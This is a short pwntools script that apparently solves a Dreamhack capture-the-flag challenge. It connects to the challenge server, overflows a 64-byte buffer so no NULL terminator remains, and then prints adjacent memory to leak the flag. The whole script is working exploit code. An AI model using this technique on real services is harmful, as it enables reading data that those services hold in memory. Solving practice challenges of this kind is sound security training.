from pwn import *

context.log_level='debug'
p = remote('host3.dreamhack.games', 12914)

def read_file():
    p.sendlineafter(b'[*] input : ', b'1')

def write_file(str):
    p.sendlineafter(b'[*] input : ', b'2')
    p.sendlineafter(b'Enter file contents : ', str)

def show_contents():
    p.sendafter(b'[*] input : ', b'3')

# write to readbuffer variable without NULL terminator
write_file(b'A'*64)
# write to flag variable
read_file()
# trigger memory leak
show_contents()

p.interactive()
